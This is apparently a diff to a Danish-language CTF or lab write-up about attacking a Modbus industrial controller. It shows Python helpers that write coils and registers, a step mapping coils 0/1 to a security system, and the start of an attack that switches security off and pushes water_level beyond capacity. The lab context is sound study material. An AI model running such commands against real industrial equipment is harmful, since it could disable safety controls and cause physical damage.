@@ -60,8 +60,11 @@ def write_reg(addr, value):    # function code 0x06
 def write_coil(addr, val):     # function code 0x05, 0xFF00=true, 0x0000=false
     return send_recv(struct.pack("&gt;BHH", 0x05, addr, 0xFF00 if val else 0x0000), host)</code></pre>
              <p>Holding register 1 = temperatur, register 2 = water_level, matcher nøjagtigt
-             web-dashboardets viste værdier (en læsning af reg 1/2 giver præcis de tal dashboardet
-             viser). Coil 0/1 hænger sammen med security-systemet.</p>
+             web-dashboardets viste værdier (en læsning af reg 1/2 giver præcis de tal dashboardet viser).
+             Coils fandt vi på samme måde: skriv én coil og se hvilket felt i <code>GET /update</code> der
+             skifter:</p>
+             <pre><code>write_coil(0, False); write_coil(1, False)
+# GET /update ->  "security": false      (coil 0/1 styrer security-systemet)</code></pre>
 <h2>Angrebet: sluk security, sæt water_level over kapacitet</h2>
 <pre><code>write_coil(0, False)
 write_coil(1, False)
